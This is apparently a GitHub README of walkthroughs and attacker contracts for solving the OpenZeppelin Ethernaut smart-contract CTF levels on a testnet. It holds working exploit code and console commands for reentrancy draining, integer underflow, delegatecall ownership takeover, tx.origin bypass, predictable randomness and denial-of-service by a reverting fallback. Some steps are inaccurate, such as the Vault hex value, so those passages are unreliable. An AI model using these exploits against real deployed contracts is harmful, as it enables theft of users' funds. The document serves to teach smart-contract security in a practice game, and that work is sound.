# Hackernaut 🧑‍🚀 [WIP]
Set of smart contracts and documentation for hacking the OpenZeppelin [Ethernaut game](https://ethernaut.openzeppelin.com/)
> **Note**: Not all the levels can be solved by creating a smart contract.
> This repository contains the contracts that solve the levels that **require** a smart contract to be solved and some steps to hack the rest of them.

Happy hacking! 😄

## Smart Contracts setup

1. Create an [Alchemy](https://www.alchemy.com/) account.
2. Create a testing Rinkeby testnet account and feed it with some RinkebyETH using the [Alchemy Faucet](https://rinkebyfaucet.com/).
3. Create a `.env` file on the root folder containing the following variables

```shell
VICTIM_ADDRESS= # Address of the current contract you want to hack
ALCHEMY_API_KEY= # Your Alchemy API Key
RINKEBY_PRIVATE_KEY= # Private key from the Rinkeby testnet account
```

## Scripts
Before hacking each level you must setup the `VICTIM_ADDRESS` env variable previously mentioned. Then, you must run the yarn deploy script according to the level:

```shell
yarn deploy -- <level_name>
```
After this, you must harcode the contract address in the respective script by overriding the `contractAddress` variable. Once done, run the following:

```shell
yarn start -- <level_name>
```

## Solutions

 - [1. Hello Ethernaut](#1-hello-ethernaut)
 - [2. Fallback](#2-fallback)
 - [3. Fallout](#3-fallout)
 - [4. Coin Flip](#4-coin-flip)
 - [5. Telephone](#5-telephone)
 - [6. Token](#6-token)
 - [7. Delegation](#7-delegation)
 - [8. Force](#8-force)
 - [9. Vault](#9-vault)
 - [10. King](#10-king)
 - [11. Re-entrancy](#11-re-entrancy)
 - [12. Elevator](#12-elevator)
 - [13. Privacy](#13-privacy)
 - [14. Gatekeeper One](#14-gatekeeper-one)
 - [15. Gatekeeper Two](#15-gatekeeper-two)
 - [16. Naught Coin](#16-naught-coin)
 - [17. Preservation](#17-preservation)
 - [18. Recovery](#18-recovery)
 - [19. Magic Number](#19-magic-number)

### 1. Hello Ethernaut

Just follow the steps and you'll get there.

---

### 2. Fallback
This level requires 2 steps to complete as described:

>You will beat this level if
>1. you claim ownership of the contract
>2. you reduce its balance to 0

#### Claiming the ownership
The trick here is to use the fallback `receive` function to get the ownership of the contract.

```sol
receive() external payable {
  require(msg.value > 0 && contributions[msg.sender] > 0);
  owner = msg.sender;
}
```
In order to archieve this, we must statisfy 2 conditions: `msg.value` must be greater than zero and our account must have contributed.

So before calling the fallback `receive` function, we need to make a contribution to the contract. We can do so as follows:

```js
await contract.contribute({ value: 1 });
```
You can also check that the contribution was successful by calling the following line

```js
await contract.contributions(player).then(Number);
```
if the number is greater than zero, then you did it.

Now we can claim the ownership of the contract calling the fallback `receive` function. In order to call fallback payable functions, we just have to send a regular transaction to the contract address as follows:

```js
await contract.sendTransaction({ value: 1 })
```
Now if the transaction was successful, we must be the new owners of this contract, let's check that.

```js
await contract.owner().then(owner => owner === player);
```
#### Reducing the balance to 0
The way to reduce the balance to 0 is by using the `withdraw` function, which sends all the current balance to the owner.

```sol
  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }
```

We are the owners of the contract, let's take those coins!

```js
await contract.withdraw();
```
---

### 3. Fallout

In this contract there is a typo (not very visible due to the text font) in the 'constructor' function. Wich means that its name does not match with the contract name.

```sol
contract Fallout {

  //...

  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```

Therefore this is just a regular public function that can be called by anyone.

```js
await contract.Fal1out({ value: 1 });
```

then you can check the ownership of the contract

```js
await contract.owner().then(owner => owner === player);
```

And we are done!

---

### 4. Coin Flip
On this level we are going to exploit the pseudo-randomness of smart contracts.

```sol
uint256 blockValue = uint256(blockhash(block.number.sub(1)));
```

Turns out that the `blockValue` is totally deterministic for a given block, which means that we can replicate this value using another smart contract and calling the function `guess` from there.

The code of the smart contract is [here](https://github.com/MCarlomagno/hackernaut/blob/main/contracts/CoinFlip.sol).

As a summary, the following function will guess the coin side successfully in every single try:

```sol
function guess() public {
  uint256 blockValue = uint256(blockhash(block.number - 1));
  uint256 coinFlip = blockValue / FACTOR;
  bool myGuess = coinFlip == 1 ? true : false;
  CoinFlipInterface(victimAddress).flip(myGuess);
}
```
Then you just have to call your `guess` function 10 times.

---

### 5. Telephone

The `msg.sender` is the address of the function caller (can be whether an ethereum account address or an smart contract address), and the `tx.origin` is the address of the account that originated the transaction.

```sol
function changeOwner(address _owner) public {
  if (tx.origin != msg.sender) {
    owner = _owner;
  }
}
```

This means that we can satisfy the condition `(tx.origin != msg.sender)` by setting up a contract between our account call and the contract call.

[Here](https://github.com/MCarlomagno/hackernaut/blob/main/contracts/Telephone.sol) is the code of the contract we are going to use, you just have to deploy it and call `claimOwnership` function.

---

### 6. Token

Here we can hack the contract by exploiting the `uint` data type design. Since it is unsigned by definition, we cannot convert it into a negative number, then the `require` statement will always be satisfied no matter what positive value we send on the `_value` parameter.

```sol
  require(balances[msg.sender] - _value >= 0);
```

Then if we substract a greater uint number from a uint we will produce an arithmetic underflow.

```sol
function transfer(address _to, uint _value) public returns (bool) {
  require(balances[msg.sender] - _value >= 0);
  balances[msg.sender] -= _value;
  balances[_to] += _value;
  return true;
}
```

So we can simply send the following transaction and after that, our balance should be something like `1.157920892373162e+77`.

```js
await contract.transfer('<some_random_address>', 21);
```

Check your balance after the transaction:

```js
await contract.balanceOf(player).then(Number);
```
---

### 7. Delegation

One important property of `delegatecall` is that executes other contractact's code in the context of the current contract.

Which means that we can claim the ownership of `Delegation` contract using the `pwn` function of the `Delegate` one.

```sol
function pwn() public {
  owner = msg.sender;
}
```
In order to do so, we need to invoke the `fallback` function of the `Delegation` contract, sending on `msg.data` the encoded name of function we want to delegate (in this case `pwn()`).

But first we need to encode the `pwn` function name in order to make it work. You can use [this online encoder](https://abi.hashex.org/) to get the right encoded name. As a result we get the following code: `dd365b8b`.

```JS
contract.sendTransaction({ data: 'dd365b8b' });
```

And that's it! now let's check if works:

```JS
await contract.owner().then(owner => owner === player);
```

---

### 8. Force

Though the standard way to send ether to a Smart Contract is by using some `payable` function (such as the `receive` function), you can force any contract to receive ether in different ways.

One way is by creating another contract that calls the `selfdestruct` keyword targeting to the contract we want to pay (setting the victim contract address as a parameter).

```sol
function takeMyMoney() public payable {
  // self destructs the contract
  // targeting to the victim contract
  // in order to force its balance to increase.
  selfdestruct(victimAddress);
}
```

Then we can deploy [this contract](https://github.com/MCarlomagno/hackernaut/blob/main/contracts/Force.sol), instance it in a variable like `yourContract`, and then send some ether as follows:

```js
await yourContract.sendTransaction({ value: 1 });
```

And finally self-destroy it calling `takeMyMoney` function pointing to the instance contract address:

```js
await yourContract.takeMyMoney();
```

---

### 9. Vault

The `private` keyword does not mean that the value of that variable is not visible by anyone. By design, the state of the blockchain is completely visible globally. Which means that by doing some research we can get the value of the `password` variable on-chain.

#### Solution #1
One way to get that value is by browsing [Etherscan](https://rinkeby.etherscan.io/) and searching by the hash of the contract created.

![Vault screenshot](/docs/vault1.png?raw=true)

Go the the `Contract` tab, and under the` Contract Creation Code` section you will see the encoded information (bytecode) that represents the data of the `contructor` call with its parameters.

![Vault screenshot 2](/docs/vault2.png?raw=true)

The bytecode is the hexadecimal representation of the Solidity code, remember that a byte is a set of 8 bits and a single hex is represented by 4 bits (`2^4 = 16`). So that means that a byte in this hexadecimal representation is composed by 2 characters (`4 bits + 4 bits = 8 bits = 1 byte`)

Since the `password` variable is bytes32 (`8 bits (byte) * 32 = 4 bits (hex) * 64`). So we must take the last 64 characters of the code, in this case `41ed2f1d39cad24fdf2b1c64736f6c63430006030033412076657279207374726f6e67207365637265742070617373776f7264203a29`.

The way to send an hexadecimal value to the contract as a parameter is by adding a `0x` prefix:

```js
await contract.unlock('0x41ed2f1d39cad24fdf2b1c64736f6c63430006030033412076657279207374726f6e67207365637265742070617373776f7264203a29');
```
Then we can check if the contract was unlocked

```js
await contract.locked();
```

#### Solution #2

There is also a much simpler way (but much less fun), this is just reading the first slot storage using the handy `getStorageAt` function of the web3 library:

```js
const password = await web3.eth.getStorageAt(contract.address, 1);
```

And then:

```js
contract.unlock(password);
```

Finally we can check if the contract was unlocked

```js
await contract.locked();
```

---

### 10. King

The way to beat this level is by taking the throne with an address that will revert the transaction before any other address can become a king.

The key function for doing this is:
```Sol
receive() external payable {
  require(msg.value >= prize || msg.sender == owner);
  // if the existing king makes the next line 
  // revert then nobody else will be able to do it.
  king.transfer(msg.value);
  king = msg.sender;
  prize = msg.value;
}
```
if the existing king makes the `transfer` line revert then nobody else will be able to override the king varaible.
```Sol
receive() external payable {
  revert();
}
```

#### Steps
1. Take the throne with your own accout.
   
```js
await contract.sendTransaction({ value: 1000000000000001 });
```

2. Deploy a contract that cant take the throne and calls `revert` when someone else tries to send a transaction.
```Sol
function becomeKing() public payable returns (bool) {
  (bool success ,) = victim.call{value: msg.value}("");
  return success;
}

receive() external payable {
  revert();
}
```
   
3. Now call `becomeKing` the contract and nobody else will take your throne again.

```js
await yourContract.becomeKing({ value: 1000000000000002 });
```

---

### 11. Re-entrancy

The trick here is tho iterate between the `withdraw` function and our contract `receive` function in order to avoid the

```sol
balances[msg.sender] -= _amount;
``` 

line to be called. To make this work we need to do a recursion using our contracts `receive` function by doing another call to the withdraw function.

```sol
function withdraw(uint _amount) public {
  if(balances[msg.sender] >= _amount) {
    // The next line will call our receive function
    // and our receive function will call withdraw again.
    (bool result,) = msg.sender.call{value:_amount}("");
    // ...
```

We should set a closing condition in order the prevent running out of gas, the condition in this case might be the victim's contract balance equals to zero.

```sol
receive() external payable {
  if(victim.balance > 0) {
    ReentranceInterface(victim).withdraw(msg.value);
  }
}
```
But before trying to call the withdraw function, we must donate to the contract in order to pass the first condition, therefore we should also donate from our attacker contract.

```sol
function donate() public payable {
  ReentranceInterface(victim).donate{ value: msg.value }(address(this));
}
```

We make our first donation, its important to use a value divisible by the current victim's balance in order to leave the victim's contract with zero balance. In each iteration we are going to steal the exact donation amount.

In this case, the victim's balance is 0.001 Ether, so we are going to donate this amount.

```js
await attackerContract.donate({value: 1000000000000000})
```

Then we just call: 

```js
await sendTransaction({ to: attackerContract.address, value: 1000000000000000 });
```

This line will trigger the `receive` function on our attacker contract and start the recursion. Once the victim balance is zero, the `receive` function will return.

---

### 12. Elevator

In this level we have an `Elevator` contract that (supposedly) does not allow to reach the last floor of the `Building` that calls it.
The `Elevator` delegates the caller contract the implementation of the `isLastFloor` function.

```sol
function goTo(uint _floor) public {
  Building building = Building(msg.sender);

  if (! building.isLastFloor(_floor)) {
    floor = _floor;
    top = building.isLastFloor(floor);
  }
}
```

Note that we can break the contract when the `isLastFloor` function is not deterministic. Meaning, the same input will not produce the same output each time.

Since the abstract function to be implemented does not clarify any state permission like `pure` or `view` we can implement whatever logic we want inside the malicious `isLastFloor` function.

```sol
interface Building {
  function isLastFloor(uint) external returns (bool);
}
```

This way we can create an implementation `isLastFloor` function that returns `false` in the first call and `true` in the second one in order to reach the last floor. You can see the full contract code [here](https://github.com/MCarlomagno/hackernaut/blob/main/contracts/Elevator.sol).

```sol
function isLastFloor(uint floor) public returns (bool) {
  if (floor == last) {
    if (firstTry) {
      // sets the first try variable 
      // to false and returns false
      firstTry = false;
      return false;
    } else {
      // resets the first try variable
      // and returns true
      firstTry = true;
      return true;
    }
  }
  // defaults to false
  return false;
}
```

We can create a function that hacks the elevator as follows:

```sol
function goToLast() public {
  Elevator(victim).goTo(last);
}
```
Then we just call this function from our client as:

```js
await myContract.goToLast();
```

And we are done, [see the full code here](https://github.com/MCarlomagno/hackernaut/blob/main/contracts/Elevator.sol).

---

### 13. Privacy

This level requires a better understanding about how Solidity optimizes storage slots storing deployed smart contracts data. We can figure out the hex value of each slot using:

```js
await web3.eth.getStorageAt(contract.address, slotNumber); // e.g slotNumber = 0 for first slot
```

Now to figure which slot contains the data[2] we must calculate the previous variable declaration and datatypes.

```sol
bool public locked = true;
uint256 public ID = block.timestamp;
uint8 private flattening = 10;
uint8 private denomination = 255;
uint16 private awkwardness = uint16(now);
bytes32[3] private data;
```

1. Slot 0: Locked.
2. Slot 1: ID.
3. Slot 2: flattening + denomination + awkwardness.
4. Slot 3: data[0].
5. Slot 4: data[1].
6. Slot 5: data[2]. -> Voilá!

Now let's get that slot value:

```js
await web3.eth.getStorageAt(contract.address, 5);
```

Then with the hexadecimal result we can setup a contract and hack the password parsing the `bytes32` to `bytes16` array.

> Note: It doesn't matters 'what' is this value, and what does it mean. We just know is the value we need to unlock the contract.

```sol
contract PrivacyBreaker {
  bytes32 public data;
  address public victim;

  constructor(bytes32 _data, address _victim) {
    data = _data;
    victim = _victim;
  }
  
  function hack() public {
    Privacy(victim).unlock(bytes16(data));
  }
}
```

After setting up the contract sending the vicim's address and our hex 'key'. We just need to run the `hack()` function as follows:

```js
await myContact.hack();
```

---

### 14. Gatekeeper One

In order to break this contract, our data needs to pass throug different conditions (3 gates) in order to prevent reverting before we van claim ourselves entrant. [See contract code here](https://github.com/MCarlomagno/hackernaut/blob/main/contracts/GatekeeperOne.sol).

#### Gate one

```sol
modifier gateOne() {
  require(msg.sender != tx.origin);
  _;
}
```

In order to satisfy this condition, we just need to setup a contract as a middleman between the origin and the function call as we did before.

#### Gate two

```sol
modifier gateTwo() {
  require(gasleft().mod(8191) == 0);
  _;
}
```

This is especially difficult because the only path to solve this one is by debugging the solidity opcodes in etherscan and figuring out **exactly** where we are using the gasLeft() result value in our require statement.

Fortunatelly there is a special opcode that is used for estimating the gas left called **GAS** [see documentation about opcodes](https://ethereum.org/en/developers/docs/evm/opcodes/).

So the steps to figure the exact gas to send are:
1. Send a transaction with any arbitrary gas.
2. Go the the debug transaction section on etherscan and find the GAS opcode in the stack trace.
3. In the next line (PUSH2 opcode) you will see the gasLeft *X* at that moment.
4. Use X to calculate the exact amount of gas needed send to the function call. eg: *gasToSend = gasSent + (81910 - X)*
5. Now you will be able to send the right amount of gas for that function call.

#### Gate three

```sol
  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }
```
This gate requires some understanding about `uintX` conversions. We will receive a `bytes8` input and cast this value many times in order to satisfy a few conditions.

```sol
require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
```
This condition requires `uint32` and `uint16` conversion to be the same, the `uint16` corresponds to the last 4 bytes of the `_key`, and `uint32` the las 8 ones (remember that if we cast a uint16 to uint32 the excedent bytes at the left will be filled with 0). So in order to satisfy this condition we can send a key that looks like `0x...0000ffff`.

```sol
require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
```

This line adds an extra requirement about the next (or previous) 8 characters, they should be different than zero, so the key should look like: `0x1111111100001111`.

```sol
require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
```

Finnally, this line take the last 4 characters and compare them with the tx.origin address (your address) last 4. So the key should look like: (eg: last 4 characters of your address 'AB12') `0x111111110000AB12`.

Once you deployed the contract, just call:

```js
await yourContract.enter("0x111111110000AB12", 82164);
```

---

### 15. Gatekeeper Two

As we did in the previous level, we need to satisfy a bunch of conditions to hack this contract.

#### Gate one

```sol
modifier gateOne() {
  require(msg.sender != tx.origin);
  _;
}
```

Exactly the same as we did in the previous level, just put a contract as a middleman and it will pass.

#### Gate two

```sol
modifier gateTwo() {
  uint x;
  assembly { x := extcodesize(caller()) }
  require(x == 0);
  _;
}
```

The `extcodesize` keyword returns the size of the contrat's code from the address sent as an argument. The `caller` keyword returns the call sender, just like msg.sender, but excluding `delegatecall`.

One exception to this rule is when we call the function directly from a contract constructor, the contract address is still unexistant, in this case, the `extcodesize(caller())` will return zero.

```sol
constructor(address victim) {
  Gatekeeper level = Gatekeeper(victim);
  bytes8 key = '0x1111111111111111';
  level.enter(key);  
}
```
And it works! The result is zero, so delegating the call we will pass the second gate.

#### Gate three

We must send a gate key that satisfy the following condition:

```sol
uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1
```

The `^` operator indicates a XOR operation, one important characteristic to consider of this operation is that if  `A ^ B = C` then `A ^ C = B`. So we can use this in our favor creating a key as follows:

```sol
uint64 key = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1;
```

Then, the code to hack this level would look like.

```sol
constructor(address victim) {
  Gatekeeper level = Gatekeeper(victim);
  bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
  level.enter(key);  
}
```

We just create the contract sending the victim address as parameter and that's it!

---

### 16. Naught Coin

If you read carefully the ERC20 contract code, there is a way around to transfer your tokens without using the `transfer` function.

```sol
function transferFrom(
  address from,
  address to,
  uint256 amount
) public virtual override returns (bool) {
  address spender = _msgSender();
  _spendAllowance(from, spender, amount);
  _transfer(from, to, amount);
  return true;
}
```

Using this function we can transfer our tokens to another address directly (note that the internal `_transfer` function was not overrided).

But first we have to allow another player (player2) to receive our tokens:

```js
const player2 = '<any_address>';
await contract.increaseAllowance(player2, await contract.INITIAL_SUPPLY());
```

Now we must give approval to the contract to make this transaction in behalf of our account:

```js
await contract.approve(player, contract.address);
```

Finally we can send all our founds from our account to the new one:

```js
await contract.transferFrom(player, player2, await contract.allowance(player, player2));
```
---

### 17. Preservation

The `delegatecall` method will overwrite the 1st contract slot in the context of the contract that has made the call. 
Therefore we can change the address of `timeZone1Library` using `setFirstTime` and passing our malicious contract address casted as `uint _time` .

```sol
  // malicious contract.
  function updateLibrary(address _victim) public {
    PreservationInterface(_victim).setFirstTime(uint160(address(this)));
  }
```

Once we changed the addres we can create a custom `function setTime(uint _time)` that will change the owner of the contract. 

```sol
function setTime(uint _time) public {
  owner = tx.origin;
}
```

And then call it directly from the level console, we can send whatever value we want.

```js
await contract.setFirstTime(0x0);
```

Finnaly, the delegated function will change the ownership of the contract.

---

### 18. Recovery

In this level the contract deployer does not know what is the address of the token created, bue we can easily get that information using Etherscan.

Just put the contract address in the etherscan explorer and check the historic transactions. Among them you will find the one that creates our target contract.

```sol
function destroyToken(address payable _victim) payable public {
  SimpleToken(_victim).destroy(payable(msg.sender));
}
```

Where `_victim` is the address of the token.

---

### 19. Magic Number

In this level, you cannot create a contract using solidity because that implies to use more opcodes than required, so the most efficient way to launch code to the EVM is by using directly opcodes casted as hex and then send a transaction without a `to` parameter (this will be interpreted as a contract creation).

We need to create a function that will return the number 42. For doing so we need to store this number in memory and then return it. 

```assembly
PUSH1 0x2a // declare 42 (2a in hex) -> 602a
PUSH1 0x80 // push it in the slot 0x80 -> 6080
MSTORE     // store the information -> 5260
PUSH1 0x20 // size of the stored data -> 2060
PUSH1 0x80 // point the memory slot -> 80f3
RETURN     // return the pointer value
```

As a result we will get the following hex string:

`
0x600a600c600039600a6000f3602a60805260206080f3
`

We declare and create the new contract

```js
const bytecode = '0x600a600c600039600a6000f3602a60805260206080f3';
web3.eth.sendTransaction({ from: player, data: bytecode });
```

And as a result we will get the hash of the transaction of the contract creation, searching in etherscan we will find the contract address.

Just set the address as the solver and it will pass.

```js
contract.setSolver('<your_contract_address>')
```
